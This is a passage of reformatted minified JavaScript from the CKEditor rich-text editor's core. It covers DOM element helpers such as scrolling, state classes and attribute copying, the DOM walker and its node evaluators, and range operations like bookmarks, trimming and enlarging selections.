                    if ((t.$.clientWidth && t.$.clientWidth < t.$.scrollWidth || t.$.clientHeight && t.$.clientHeight < t.$.scrollHeight) && !t.is("body") && this.scrollIntoParent(t, e, 1),
                    t.is("html")) {
                        var n = t.getWindow();
                        try {
                            var i = n.$.frameElement;
                            i && (t = new CKEDITOR.dom.element(i));
                        } catch (e) {}
                    }
                } while (t = t.getParent());
            },
            scrollIntoParent: function(n, e, t) {
                function i(e, t) {
                    /body|html/.test(n.getName()) ? n.getWindow().$.scrollBy(e, t) : (n.$.scrollLeft = n.$.scrollLeft + e,
                    n.$.scrollTop = n.$.scrollTop + t);
                }
                function o(e, t) {
                    var n = {
                        x: 0,
                        y: 0
                    };
                    if (!e.is(d ? "body" : "html")) {
                        var i = e.$.getBoundingClientRect();
                        n.x = i.left, n.y = i.top;
                    }
                    return (i = e.getWindow()).equals(t) || (i = o(CKEDITOR.dom.element.get(i.$.frameElement), t),
                    n.x = n.x + i.x, n.y = n.y + i.y), n;
                }
                function a(e, t) {
                    return parseInt(e.getComputedStyle("margin-" + t) || 0, 10) || 0;
                }
                var r, s, l, c;
                !n && (n = this.getWindow());
                var d = "BackCompat" == (l = n.getDocument()).$.compatMode;
                n instanceof CKEDITOR.dom.window && (n = d ? l.getBody() : l.getDocumentElement()),
                s = o(this, l = n.getWindow());
                var u = o(n, l), h = this.$.offsetHeight;
                r = this.$.offsetWidth;
                var f = n.$.clientHeight, m = n.$.clientWidth;
                l = s.x - a(this, "left") - u.x || 0, c = s.y - a(this, "top") - u.y || 0, r = s.x + r + a(this, "right") - (u.x + m) || 0,
                s = s.y + h + a(this, "bottom") - (u.y + f) || 0, (c < 0 || 0 < s) && i(0, !0 === e ? c : !1 === e ? s : c < 0 ? c : s),
                t && (l < 0 || 0 < r) && i(l < 0 ? l : r, 0);
            },
            setState: function(e, t, n) {
                switch (t = t || "cke", e) {
                  case CKEDITOR.TRISTATE_ON:
                    this.addClass(t + "_on"), this.removeClass(t + "_off"), this.removeClass(t + "_disabled"),
                    n && this.setAttribute("aria-pressed", !0), n && this.removeAttribute("aria-disabled");
                    break;

                  case CKEDITOR.TRISTATE_DISABLED:
                    this.addClass(t + "_disabled"), this.removeClass(t + "_off"), this.removeClass(t + "_on"),
                    n && this.setAttribute("aria-disabled", !0), n && this.removeAttribute("aria-pressed");
                    break;

                  default:
                    this.addClass(t + "_off"), this.removeClass(t + "_on"), this.removeClass(t + "_disabled"),
                    n && this.removeAttribute("aria-pressed"), n && this.removeAttribute("aria-disabled");
                }
            },
            getFrameDocument: function() {
                var t = this.$;
                try {
                    t.contentWindow.document;
                } catch (e) {
                    t.src = t.src;
                }
                return t && new CKEDITOR.dom.document(t.contentWindow.document);
            },
            copyAttributes: function(e, t) {
                for (var n = this.$.attributes, i = (t = t || {}, 0); i < n.length; i++) {
                    var o, a = n[i], r = a.nodeName.toLowerCase();
                    r in t || ("checked" == r && (o = this.getAttribute(r)) ? e.setAttribute(r, o) : CKEDITOR.env.ie && !this.hasAttribute(r) || (null === (o = this.getAttribute(r)) && (o = a.nodeValue),
                    e.setAttribute(r, o)));
                }
                "" !== this.$.style.cssText && (e.$.style.cssText = this.$.style.cssText);
            },
            renameNode: function(e) {
                if (this.getName() != e) {
                    var t = this.getDocument();
                    e = new CKEDITOR.dom.element(e, t), this.copyAttributes(e), this.moveChildren(e),
                    this.getParent() && this.$.parentNode.replaceChild(e.$, this.$), e.$["data-cke-expando"] = this.$["data-cke-expando"],
                    this.$ = e.$, delete this.getName;
                }
            },
            getChild: function() {
                function n(e, t) {
                    var n = e.childNodes;
                    if (0 <= t && t < n.length) return n[t];
                }
                return function(e) {
                    var t = this.$;
                    if (e.slice) for (;0 < e.length && t; ) t = n(t, e.shift()); else t = n(t, e);
                    return t ? new CKEDITOR.dom.node(t) : null;
                };
            }(),
            getChildCount: function() {
                return this.$.childNodes.length;
            },
            disableContextMenu: function() {
                this.on("contextmenu", function(e) {
                    e.data.getTarget().hasClass("cke_enable_context_menu") || e.data.preventDefault();
                });
            },
            getDirection: function(e) {
                return e ? this.getComputedStyle("direction") || this.getDirection() || this.getParent() && this.getParent().getDirection(1) || this.getDocument().$.dir || "ltr" : this.getStyle("direction") || this.getAttribute("dir");
            },
            data: function(e, t) {
                return e = "data-" + e, void 0 === t ? this.getAttribute(e) : (!1 === t ? this.removeAttribute(e) : this.setAttribute(e, t),
                null);
            },
            getEditor: function() {
                var e, t, n = CKEDITOR.instances;
                for (e in n) if ((t = n[e]).element.equals(this) && t.elementMode != CKEDITOR.ELEMENT_MODE_APPENDTO) return t;
                return null;
            },
            find: function(e) {
                var t = n(this);
                return e = new CKEDITOR.dom.nodeList(this.$.querySelectorAll(i(this, e))), t(),
                e;
            },
            findOne: function(e) {
                var t = n(this);
                return e = this.$.querySelector(i(this, e)), t(), e ? new CKEDITOR.dom.element(e) : null;
            },
            forEach: function(e, t, n) {
                if (!(n || t && this.type != t)) var i = e(this);
                if (!1 !== i) {
                    n = this.getChildren();
                    for (var o = 0; o < n.count(); o++) (i = n.getItem(o)).type == CKEDITOR.NODE_ELEMENT ? i.forEach(e, t) : (!t || i.type == t) && e(i);
                }
            }
        });
        var r = {
            width: [ "border-left-width", "border-right-width", "padding-left", "padding-right" ],
            height: [ "border-top-width", "border-bottom-width", "padding-top", "padding-bottom" ]
        };
        CKEDITOR.dom.element.prototype.setSize = function(e, t, n) {
            "number" == typeof t && (!n || CKEDITOR.env.ie && CKEDITOR.env.quirks || (t -= o.call(this, e)),
            this.setStyle(e, t + "px"));
        }, CKEDITOR.dom.element.prototype.getSize = function(e, t) {
            var n = Math.max(this.$["offset" + CKEDITOR.tools.capitalize(e)], this.$["client" + CKEDITOR.tools.capitalize(e)]) || 0;
            return t && (n -= o.call(this, e)), n;
        };
    }(), CKEDITOR.dom.documentFragment = function(e) {
        e = e || CKEDITOR.document, this.$ = e.type == CKEDITOR.NODE_DOCUMENT ? e.$.createDocumentFragment() : e;
    }, CKEDITOR.tools.extend(CKEDITOR.dom.documentFragment.prototype, CKEDITOR.dom.element.prototype, {
        type: CKEDITOR.NODE_DOCUMENT_FRAGMENT,
        insertAfterNode: function(e) {
            (e = e.$).parentNode.insertBefore(this.$, e.nextSibling);
        }
    }, !0, {
        append: 1,
        appendBogus: 1,
        getFirst: 1,
        getLast: 1,
        getParent: 1,
        getNext: 1,
        getPrevious: 1,
        appendTo: 1,
        moveChildren: 1,
        insertBefore: 1,
        insertAfterNode: 1,
        replace: 1,
        trim: 1,
        type: 1,
        ltrim: 1,
        rtrim: 1,
        getDocument: 1,
        getChildCount: 1,
        getChild: 1,
        getChildren: 1
    }), function() {
        function i(e, t) {
            var n = this.range;
            if (this._.end) return null;
            if (!this._.start) {
                if (this._.start = 1, n.collapsed) return this.end(), null;
                n.optimize();
            }
            var i, o = n.startContainer;
            i = n.endContainer;
            var a, r = n.startOffset, s = n.endOffset, l = this.guard, c = this.type, d = e ? "getPreviousSourceNode" : "getNextSourceNode";
            if (!e && !this._.guardLTR) {
                var u = i.type == CKEDITOR.NODE_ELEMENT ? i : i.getParent(), h = i.type == CKEDITOR.NODE_ELEMENT ? i.getChild(s) : i.getNext();
                this._.guardLTR = function(e, t) {
                    return !(t && u.equals(e) || h && e.equals(h) || e.type == CKEDITOR.NODE_ELEMENT && t && e.equals(n.root));
                };
            }
            if (e && !this._.guardRTL) {
                var f = o.type == CKEDITOR.NODE_ELEMENT ? o : o.getParent(), m = o.type == CKEDITOR.NODE_ELEMENT ? r ? o.getChild(r - 1) : null : o.getPrevious();
                this._.guardRTL = function(e, t) {
                    return !(t && f.equals(e) || m && e.equals(m) || e.type == CKEDITOR.NODE_ELEMENT && t && e.equals(n.root));
                };
            }
            var g = e ? this._.guardRTL : this._.guardLTR;
            for (a = l ? function(e, t) {
                return !1 !== g(e, t) && l(e, t);
            } : g, this.current ? i = this.current[d](!1, c, a) : (e ? i.type == CKEDITOR.NODE_ELEMENT && (i = 0 < s ? i.getChild(s - 1) : !1 === a(i, !0) ? null : i.getPreviousSourceNode(!0, c, a)) : (i = o).type != CKEDITOR.NODE_ELEMENT || (i = i.getChild(r)) || (i = !1 === a(o, !0) ? null : o.getNextSourceNode(!0, c, a)),
            i && !1 === a(i) && (i = null)); i && !this._.end; ) {
                if (this.current = i, this.evaluator && !1 === this.evaluator(i)) {
                    if (t && this.evaluator) return !1;
                } else if (!t) return i;
                i = i[d](!1, c, a);
            }
            return this.end(), this.current = null;
        }
        function e(e) {
            for (var t, n = null; t = i.call(this, e); ) n = t;
            return n;
        }
        CKEDITOR.dom.walker = CKEDITOR.tools.createClass({
            $: function(e) {
                this.range = e, this._ = {};
            },
            proto: {
                end: function() {
                    this._.end = 1;
                },
                next: function() {
                    return i.call(this);
                },
                previous: function() {
                    return i.call(this, 1);
                },
                checkForward: function() {
                    return !1 !== i.call(this, 0, 1);
                },
                checkBackward: function() {
                    return !1 !== i.call(this, 1, 1);
                },
                lastForward: function() {
                    return e.call(this);
                },
                lastBackward: function() {
                    return e.call(this, 1);
                },
                reset: function() {
                    delete this.current, this._ = {};
                }
            }
        });
        var t = {
            block: 1,
            "list-item": 1,
            table: 1,
            "table-row-group": 1,
            "table-header-group": 1,
            "table-footer-group": 1,
            "table-row": 1,
            "table-column-group": 1,
            "table-column": 1,
            "table-cell": 1,
            "table-caption": 1
        }, n = {
            absolute: 1,
            fixed: 1
        };
        CKEDITOR.dom.element.prototype.isBlockBoundary = function(e) {
            return !("none" != this.getComputedStyle("float") || this.getComputedStyle("position") in n || !t[this.getComputedStyle("display")]) || !!(this.is(CKEDITOR.dtd.$block) || e && this.is(e));
        }, CKEDITOR.dom.walker.blockBoundary = function(t) {
            return function(e) {
                return !(e.type == CKEDITOR.NODE_ELEMENT && e.isBlockBoundary(t));
            };
        }, CKEDITOR.dom.walker.listItemBoundary = function() {
            return this.blockBoundary({
                br: 1
            });
        }, CKEDITOR.dom.walker.bookmark = function(i, o) {
            function a(e) {
                return e && e.getName && "span" == e.getName() && e.data("cke-bookmark");
            }
            return function(e) {
                var t, n;
                return t = e && e.type != CKEDITOR.NODE_ELEMENT && (n = e.getParent()) && a(n),
                t = i ? t : t || a(e), !!(o ^ t);
            };
        }, CKEDITOR.dom.walker.whitespaces = function(n) {
            return function(e) {
                var t;
                return e && e.type == CKEDITOR.NODE_TEXT && (t = !CKEDITOR.tools.trim(e.getText()) || CKEDITOR.env.webkit && "​" == e.getText()),
                !!(n ^ t);
            };
        }, CKEDITOR.dom.walker.invisible = function(t) {
            var n = CKEDITOR.dom.walker.whitespaces(), i = CKEDITOR.env.webkit ? 1 : 0;
            return function(e) {
                return n(e) ? e = 1 : (e.type == CKEDITOR.NODE_TEXT && (e = e.getParent()), e = e.$.offsetWidth <= i),
                !!(t ^ e);
            };
        }, CKEDITOR.dom.walker.nodeType = function(t, n) {
            return function(e) {
                return !!(n ^ e.type == t);
            };
        }, CKEDITOR.dom.walker.bogus = function(n) {
            function i(e) {
                return !a(e) && !r(e);
            }
            return function(e) {
                var t = CKEDITOR.env.needsBrFiller ? e.is && e.is("br") : e.getText && o.test(e.getText());
                return t && (t = e.getParent(), e = e.getNext(i), t = t.isBlockBoundary() && (!e || e.type == CKEDITOR.NODE_ELEMENT && e.isBlockBoundary())),
                !!(n ^ t);
            };
        }, CKEDITOR.dom.walker.temp = function(t) {
            return function(e) {
                return e.type != CKEDITOR.NODE_ELEMENT && (e = e.getParent()), e = e && e.hasAttribute("data-cke-temp"),
                !!(t ^ e);
            };
        };
        var o = /^[\t\r\n ]*(?:&nbsp;|\xa0)$/, a = CKEDITOR.dom.walker.whitespaces(), r = CKEDITOR.dom.walker.bookmark(), s = CKEDITOR.dom.walker.temp();
        CKEDITOR.dom.walker.ignored = function(t) {
            return function(e) {
                return e = a(e) || r(e) || s(e), !!(t ^ e);
            };
        };
        var l = CKEDITOR.dom.walker.ignored(), c = function(e) {
            var t, n = {};
            for (t in e) CKEDITOR.dtd[t]["#"] && (n[t] = 1);
            return n;
        }(CKEDITOR.dtd.$block);
        CKEDITOR.dom.walker.editable = function(t) {
            return function(e) {
                return !!(t ^ function(e) {
                    if (l(e)) return !1;
                    if (e.type == CKEDITOR.NODE_TEXT) return !0;
                    if (e.type == CKEDITOR.NODE_ELEMENT) {
                        if (e.is(CKEDITOR.dtd.$inline) || e.is("hr") || "false" == e.getAttribute("contenteditable")) return !0;
                        var t;
                        if ((t = !CKEDITOR.env.needsBrFiller) && (t = e.is(c))) e: {
                            t = 0;
                            for (var n = e.getChildCount(); t < n; ++t) if (!l(e.getChild(t))) {
                                t = !1;
                                break e;
                            }
                            t = !0;
                        }
                        if (t) return !0;
                    }
                    return !1;
                }(e));
            };
        }, CKEDITOR.dom.element.prototype.getBogus = function() {
            for (var e = this; e = e.getPreviousSourceNode(), r(e) || a(e) || e.type == CKEDITOR.NODE_ELEMENT && e.is(CKEDITOR.dtd.$inline) && !e.is(CKEDITOR.dtd.$empty); ) ;
            return !(!e || !(CKEDITOR.env.needsBrFiller ? e.is && e.is("br") : e.getText && o.test(e.getText()))) && e;
        };
    }(), CKEDITOR.dom.range = function(e) {
        this.endOffset = this.endContainer = this.startOffset = this.startContainer = null,
        this.collapsed = !0;
        var t = e instanceof CKEDITOR.dom.document;
        this.document = t ? e : e.getDocument(), this.root = t ? e.getBody() : e;
    }, function() {
        function n() {
            var t = !1, n = CKEDITOR.dom.walker.whitespaces(), i = CKEDITOR.dom.walker.bookmark(!0), o = CKEDITOR.dom.walker.bogus();
            return function(e) {
                return !(!i(e) && !n(e)) || (o(e) && !t ? t = !0 : !(e.type == CKEDITOR.NODE_TEXT && (e.hasAscendant("pre") || CKEDITOR.tools.trim(e.getText()).length) || e.type == CKEDITOR.NODE_ELEMENT && !e.is(a)));
            };
        }
        function e(e) {
            return function() {
                var t;
                return this[e ? "getPreviousNode" : "getNextNode"](function(e) {
                    return !t && c(e) && (t = e), l(e) && !(s(e) && e.equals(t));
                });
            };
        }
        var i = function(e) {
            e.collapsed = e.startContainer && e.endContainer && e.startContainer.equals(e.endContainer) && e.startOffset == e.endOffset;
        }, o = function(e, t, n, i) {
            e.optimizeBookmark();
            var o, a, r, s, l, c = e.startContainer, d = e.endContainer, u = e.startOffset, h = e.endOffset;
            for (d.type == CKEDITOR.NODE_TEXT ? d = d.split(h) : 0 < d.getChildCount() && (h >= d.getChildCount() ? (d = d.append(e.document.createText("")),
            a = !0) : d = d.getChild(h)), c.type == CKEDITOR.NODE_TEXT ? (c.split(u), c.equals(d) && (d = c.getNext())) : u ? u >= c.getChildCount() ? (c = c.append(e.document.createText("")),
            o = !0) : c = c.getChild(u).getPrevious() : (c = c.append(e.document.createText(""), 1),
            o = !0), u = c.getParents(), h = d.getParents(), r = 0; r < u.length && (s = u[r],
            l = h[r], s.equals(l)); r++) ;
            for (var f, m, g, E = n, p = r; p < u.length; p++) {
                for (f = u[p], E && !f.equals(c) && (m = E.append(f.clone())), f = f.getNext(); f && !f.equals(h[p]) && !f.equals(d); ) g = f.getNext(),
                2 == t ? E.append(f.clone(!0)) : (f.remove(), 1 == t && E.append(f)), f = g;
                E && (E = m);
            }
            for (E = n, n = r; n < h.length; n++) {
                if (f = h[n], 0 < t && !f.equals(d) && (m = E.append(f.clone())), !u[n] || f.$.parentNode != u[n].$.parentNode) for (f = f.getPrevious(); f && !f.equals(u[n]) && !f.equals(c); ) g = f.getPrevious(),
                2 == t ? E.$.insertBefore(f.$.cloneNode(!0), E.$.firstChild) : (f.remove(), 1 == t && E.$.insertBefore(f.$, E.$.firstChild)),
                f = g;
                E && (E = m);
            }
            2 == t ? ((s = e.startContainer).type == CKEDITOR.NODE_TEXT && (s.$.data = s.$.data + s.$.nextSibling.data,
            s.$.parentNode.removeChild(s.$.nextSibling)), (e = e.endContainer).type == CKEDITOR.NODE_TEXT && e.$.nextSibling && (e.$.data = e.$.data + e.$.nextSibling.data,
            e.$.parentNode.removeChild(e.$.nextSibling))) : (s && l && (c.$.parentNode != s.$.parentNode || d.$.parentNode != l.$.parentNode) && (t = l.getIndex(),
            o && l.$.parentNode == c.$.parentNode && t--, i && s.type == CKEDITOR.NODE_ELEMENT ? ((i = CKEDITOR.dom.element.createFromHtml('<span data-cke-bookmark="1" style="display:none">&nbsp;</span>', e.document)).insertAfter(s),
            s.mergeSiblings(!1), e.moveToBookmark({
                startNode: i
            })) : e.setStart(l.getParent(), t)), e.collapse(!0)), o && c.remove(), a && d.$.parentNode && d.remove();
        }, a = {
            abbr: 1,
            acronym: 1,
            b: 1,
            bdo: 1,
            big: 1,
            cite: 1,
            code: 1,
            del: 1,
            dfn: 1,
            em: 1,
            font: 1,
            i: 1,
            ins: 1,
            label: 1,
            kbd: 1,
            q: 1,
            samp: 1,
            small: 1,
            span: 1,
            strike: 1,
            strong: 1,
            sub: 1,
            sup: 1,
            tt: 1,
            u: 1,
            var: 1
        }, s = CKEDITOR.dom.walker.bogus(), r = /^[\t\r\n ]*(?:&nbsp;|\xa0)$/, l = CKEDITOR.dom.walker.editable(), c = CKEDITOR.dom.walker.ignored(!0);
        CKEDITOR.dom.range.prototype = {
            clone: function() {
                var e = new CKEDITOR.dom.range(this.root);
                return e._setStartContainer(this.startContainer), e.startOffset = this.startOffset,
                e._setEndContainer(this.endContainer), e.endOffset = this.endOffset, e.collapsed = this.collapsed,
                e;
            },
            collapse: function(e) {
                e ? (this._setEndContainer(this.startContainer), this.endOffset = this.startOffset) : (this._setStartContainer(this.endContainer),
                this.startOffset = this.endOffset), this.collapsed = !0;
            },
            cloneContents: function() {
                var e = new CKEDITOR.dom.documentFragment(this.document);
                return this.collapsed || o(this, 2, e), e;
            },
            deleteContents: function(e) {
                this.collapsed || o(this, 0, null, e);
            },
            extractContents: function(e) {
                var t = new CKEDITOR.dom.documentFragment(this.document);
                return this.collapsed || o(this, 1, t, e), t;
            },
            createBookmark: function(e) {
                var t, n, i, o, a = this.collapsed;
                return (t = this.document.createElement("span")).data("cke-bookmark", 1), t.setStyle("display", "none"),
                t.setHtml("&nbsp;"), e && (i = "cke_bm_" + CKEDITOR.tools.getNextNumber(), t.setAttribute("id", i + (a ? "C" : "S"))),
                a || ((n = t.clone()).setHtml("&nbsp;"), e && n.setAttribute("id", i + "E"), (o = this.clone()).collapse(),
                o.insertNode(n)), (o = this.clone()).collapse(!0), o.insertNode(t), n ? (this.setStartAfter(t),
                this.setEndBefore(n)) : this.moveToPosition(t, CKEDITOR.POSITION_AFTER_END), {
                    startNode: e ? i + (a ? "C" : "S") : t,
                    endNode: e ? i + "E" : n,
                    serializable: e,
                    collapsed: a
                };
            },
            createBookmark2: function() {
                function o(e) {
                    var t, n = e.container, i = e.offset, o = i;
                    if ((t = (t = n).type != CKEDITOR.NODE_ELEMENT || 0 === o || o == t.getChildCount() ? 0 : t.getChild(o - 1).type == CKEDITOR.NODE_TEXT && t.getChild(o).type == CKEDITOR.NODE_TEXT) && (i = (n = n.getChild(i - 1)).getLength()),
                    n.type == CKEDITOR.NODE_ELEMENT && 1 < i && (i = n.getChild(i - 1).getIndex(!0) + 1),
                    n.type == CKEDITOR.NODE_TEXT) {
                        for (t = n, o = 0; (t = t.getPrevious()) && t.type == CKEDITOR.NODE_TEXT; ) o += t.getLength();
                        t = o, n.getText() ? i += t : (o = n.getPrevious(a), t ? (i = t, n = o ? o.getNext() : n.getParent().getFirst()) : (n = n.getParent(),
                        i = o ? o.getIndex(!0) + 1 : 0));
                    }
                    e.container = n, e.offset = i;
                }
                var a = CKEDITOR.dom.walker.nodeType(CKEDITOR.NODE_TEXT, !0);
                return function(e) {
                    var t = this.collapsed, n = {
                        container: this.startContainer,
                        offset: this.startOffset
                    }, i = {
                        container: this.endContainer,
                        offset: this.endOffset
                    };
                    return e && (o(n), t || o(i)), {
                        start: n.container.getAddress(e),
                        end: t ? null : i.container.getAddress(e),
                        startOffset: n.offset,
                        endOffset: i.offset,
                        normalized: e,
                        collapsed: t,
                        is2: !0
                    };
                };
            }(),
            moveToBookmark: function(e) {
                if (e.is2) {
                    var t = this.document.getByAddress(e.start, e.normalized), n = e.startOffset, i = e.end && this.document.getByAddress(e.end, e.normalized);
                    e = e.endOffset, this.setStart(t, n), i ? this.setEnd(i, e) : this.collapse(!0);
                } else t = (n = e.serializable) ? this.document.getById(e.startNode) : e.startNode,
                e = n ? this.document.getById(e.endNode) : e.endNode, this.setStartBefore(t), t.remove(),
                e ? (this.setEndBefore(e), e.remove()) : this.collapse(!0);
            },
            getBoundaryNodes: function() {
                var e, t = this.startContainer, n = this.endContainer, i = this.startOffset, o = this.endOffset;
                if (t.type == CKEDITOR.NODE_ELEMENT) if ((e = t.getChildCount()) > i) t = t.getChild(i); else if (e < 1) t = t.getPreviousSourceNode(); else {
                    for (t = t.$; t.lastChild; ) t = t.lastChild;
                    t = (t = new CKEDITOR.dom.node(t)).getNextSourceNode() || t;
                }
                if (n.type == CKEDITOR.NODE_ELEMENT) if ((e = n.getChildCount()) > o) n = n.getChild(o).getPreviousSourceNode(!0); else if (e < 1) n = n.getPreviousSourceNode(); else {
                    for (n = n.$; n.lastChild; ) n = n.lastChild;
                    n = new CKEDITOR.dom.node(n);
                }
                return t.getPosition(n) & CKEDITOR.POSITION_FOLLOWING && (t = n), {
                    startNode: t,
                    endNode: n
                };
            },
            getCommonAncestor: function(e, t) {
                var n = this.startContainer, i = this.endContainer;
                return n = n.equals(i) ? e && n.type == CKEDITOR.NODE_ELEMENT && this.startOffset == this.endOffset - 1 ? n.getChild(this.startOffset) : n : n.getCommonAncestor(i),
                t && !n.is ? n.getParent() : n;
            },
            optimize: function() {
                var e = this.startContainer, t = this.startOffset;
                e.type != CKEDITOR.NODE_ELEMENT && (t ? t >= e.getLength() && this.setStartAfter(e) : this.setStartBefore(e)),
                e = this.endContainer, t = this.endOffset, e.type != CKEDITOR.NODE_ELEMENT && (t ? t >= e.getLength() && this.setEndAfter(e) : this.setEndBefore(e));
            },
            optimizeBookmark: function() {
                var e = this.startContainer, t = this.endContainer;
                e.is && e.is("span") && e.data("cke-bookmark") && this.setStartAt(e, CKEDITOR.POSITION_BEFORE_START),
                t && t.is && t.is("span") && t.data("cke-bookmark") && this.setEndAt(t, CKEDITOR.POSITION_AFTER_END);
            },
            trim: function(e, t) {
                var n = this.startContainer, i = this.startOffset, o = this.collapsed;
                if ((!e || o) && n && n.type == CKEDITOR.NODE_TEXT) {
                    if (i) if (i >= n.getLength()) i = n.getIndex() + 1, n = n.getParent(); else {
                        var a = n.split(i);
                        i = n.getIndex() + 1, n = n.getParent(), this.startContainer.equals(this.endContainer) ? this.setEnd(a, this.endOffset - this.startOffset) : n.equals(this.endContainer) && (this.endOffset = this.endOffset + 1);
                    } else i = n.getIndex(), n = n.getParent();
                    if (this.setStart(n, i), o) return void this.collapse(!0);
                }
                n = this.endContainer, i = this.endOffset, t || o || !n || n.type != CKEDITOR.NODE_TEXT || (i ? (i >= n.getLength() || n.split(i),
                i = n.getIndex() + 1) : i = n.getIndex(), n = n.getParent(), this.setEnd(n, i));
            },
            enlarge: function(e, t) {
                function n(e) {
                    return e && e.type == CKEDITOR.NODE_ELEMENT && e.hasAttribute("contenteditable") ? null : e;
                }
                var o = RegExp(/[^\s\ufeff]/);
                switch (e) {
                  case CKEDITOR.ENLARGE_INLINE:
                    R = 1;

                  case CKEDITOR.ENLARGE_ELEMENT:
                    if (this.collapsed) break;
                    var i, a, r, s, l, c, d, u = this.getCommonAncestor(), h = this.root, f = !1;
                    for (c = this.startContainer, g = this.startOffset, c.type == CKEDITOR.NODE_TEXT ? (g && (f = !!(c = !CKEDITOR.tools.trim(c.substring(0, g)).length && c)),
                    c && !(s = c.getPrevious()) && (r = c.getParent())) : (g && (s = c.getChild(g - 1) || c.getLast()),
                    s || (r = c)), r = n(r); r || s; ) {
                        if (r && !s) {
                            if (!l && r.equals(u) && (l = !0), R ? r.isBlockBoundary() : !h.contains(r)) break;
                            f && "inline" == r.getComputedStyle("display") || (f = !1, l ? i = r : this.setStartBefore(r)),
                            s = r.getPrevious();
                        }
                        for (;s; ) if (c = !1, s.type == CKEDITOR.NODE_COMMENT) s = s.getPrevious(); else {
                            if (s.type == CKEDITOR.NODE_TEXT) d = s.getText(), o.test(d) && (s = null), c = /[\s\ufeff]$/.test(d); else if ((s.$.offsetWidth > (CKEDITOR.env.webkit ? 1 : 0) || t && s.is("br")) && !s.data("cke-bookmark")) if (f && CKEDITOR.dtd.$removeEmpty[s.getName()]) {
                                if (d = s.getText(), o.test(d)) s = null; else for (var m, g = s.$.getElementsByTagName("*"), E = 0; m = g[E++]; ) if (!CKEDITOR.dtd.$removeEmpty[m.nodeName.toLowerCase()]) {
                                    s = null;
                                    break;
                                }
                                s && (c = !!d.length);
                            } else s = null;
                            if (c && (f ? l ? i = r : r && this.setStartBefore(r) : f = !0), s) {
                                if (c = s.getPrevious(), !r && !c) {
                                    r = s, s = null;
                                    break;
                                }
                                s = c;
                            } else r = null;
                        }
                        r && (r = n(r.getParent()));
                    }
                    c = this.endContainer, g = this.endOffset, r = s = null, l = f = !1;
                    var p = function(e, t) {
                        var n, i = new CKEDITOR.dom.range(h);
                        for (i.setStart(e, t), i.setEndAt(h, CKEDITOR.POSITION_BEFORE_END), (i = new CKEDITOR.dom.walker(i)).guard = function(e) {
                            return !(e.type == CKEDITOR.NODE_ELEMENT && e.isBlockBoundary());
                        }; n = i.next(); ) {
                            if (n.type != CKEDITOR.NODE_TEXT) return !1;
                            if (d = n != e ? n.getText() : n.substring(t), o.test(d)) return !1;
                        }
                        return !0;
                    };
                    for (c.type == CKEDITOR.NODE_TEXT ? CKEDITOR.tools.trim(c.substring(g)).length ? f = !0 : (f = !c.getLength(),
                    g == c.getLength() ? (s = c.getNext()) || (r = c.getParent()) : p(c, g) && (r = c.getParent())) : (s = c.getChild(g)) || (r = c); r || s; ) {
                        if (r && !s) {
                            if (!l && r.equals(u) && (l = !0), R ? r.isBlockBoundary() : !h.contains(r)) break;
                            f && "inline" == r.getComputedStyle("display") || (f = !1, l ? a = r : r && this.setEndAfter(r)),
                            s = r.getNext();
                        }
                        for (;s; ) {
                            if (c = !1, s.type == CKEDITOR.NODE_TEXT) d = s.getText(), p(s, 0) || (s = null),
                            c = /^[\s\ufeff]/.test(d); else if (s.type == CKEDITOR.NODE_ELEMENT) {
                                if ((0 < s.$.offsetWidth || t && s.is("br")) && !s.data("cke-bookmark")) if (f && CKEDITOR.dtd.$removeEmpty[s.getName()]) {
                                    if (d = s.getText(), o.test(d)) s = null; else for (g = s.$.getElementsByTagName("*"),
                                    E = 0; m = g[E++]; ) if (!CKEDITOR.dtd.$removeEmpty[m.nodeName.toLowerCase()]) {
                                        s = null;
                                        break;
                                    }
                                    s && (c = !!d.length);
                                } else s = null;
                            } else c = 1;
                            if (c && f && (l ? a = r : this.setEndAfter(r)), s) {
                                if (c = s.getNext(), !r && !c) {
                                    r = s, s = null;
                                    break;
                                }
                                s = c;
                            } else r = null;
                        }
                        r && (r = n(r.getParent()));
                    }
                    i && a && (u = i.contains(a) ? a : i, this.setStartBefore(u), this.setEndAfter(u));
                    break;

                  case CKEDITOR.ENLARGE_BLOCK_CONTENTS:
                  case CKEDITOR.ENLARGE_LIST_ITEM_CONTENTS:
                    r = new CKEDITOR.dom.range(this.root), h = this.root, r.setStartAt(h, CKEDITOR.POSITION_AFTER_START),
                    r.setEnd(this.startContainer, this.startOffset), r = new CKEDITOR.dom.walker(r);
                    var T, C, I = CKEDITOR.dom.walker.blockBoundary(e == CKEDITOR.ENLARGE_LIST_ITEM_CONTENTS ? {
                        br: 1
                    } : null), O = null, D = function(e) {
                        if (e.type == CKEDITOR.NODE_ELEMENT && "false" == e.getAttribute("contenteditable")) if (O) {
                            if (O.equals(e)) return void (O = null);
                        } else O = e; else if (O) return;
                        var t = I(e);
                        return t || (T = e), t;
                    }, R = function(e) {
                        var t = D(e);
                        return !t && e.is && e.is("br") && (C = e), t;
                    };
                    if (r.guard = D, r = r.lastBackward(), T = T || h, this.setStartAt(T, !T.is("br") && (!r && this.checkStartOfBlock() || r && T.contains(r)) ? CKEDITOR.POSITION_AFTER_START : CKEDITOR.POSITION_AFTER_END),
                    e == CKEDITOR.ENLARGE_LIST_ITEM_CONTENTS) {
                        r = this.clone(), r = new CKEDITOR.dom.walker(r);
                        var v = CKEDITOR.dom.walker.whitespaces(), b = CKEDITOR.dom.walker.bookmark();
                        if (r.evaluator = function(e) {
                            return !v(e) && !b(e);
                        }, (r = r.previous()) && r.type == CKEDITOR.NODE_ELEMENT && r.is("br")) break;
                    }
                    (r = this.clone()).collapse(), r.setEndAt(h, CKEDITOR.POSITION_BEFORE_END), (r = new CKEDITOR.dom.walker(r)).guard = e == CKEDITOR.ENLARGE_LIST_ITEM_CONTENTS ? R : D,
                    T = O = C = null, r = r.lastForward(), T = T || h, this.setEndAt(T, !r && this.checkEndOfBlock() || r && T.contains(r) ? CKEDITOR.POSITION_BEFORE_END : CKEDITOR.POSITION_BEFORE_START),
                    C && this.setEndAfter(C);
                }
            },
            shrink: function(n, e, i) {
                if (!this.collapsed) {
                    n = n || CKEDITOR.SHRINK_TEXT;
                    var t = this.clone(), o = this.startContainer, a = this.endContainer, r = this.startOffset, s = this.endOffset, l = 1, c = 1;
                    o && o.type == CKEDITOR.NODE_TEXT && (r ? r >= o.getLength() ? t.setStartAfter(o) : (t.setStartBefore(o),
                    l = 0) : t.setStartBefore(o)), a && a.type == CKEDITOR.NODE_TEXT && (s ? s >= a.getLength() ? t.setEndAfter(a) : (t.setEndAfter(a),
                    c = 0) : t.setEndBefore(a)), t = new CKEDITOR.dom.walker(t);
                    var d, u = CKEDITOR.dom.walker.bookmark();
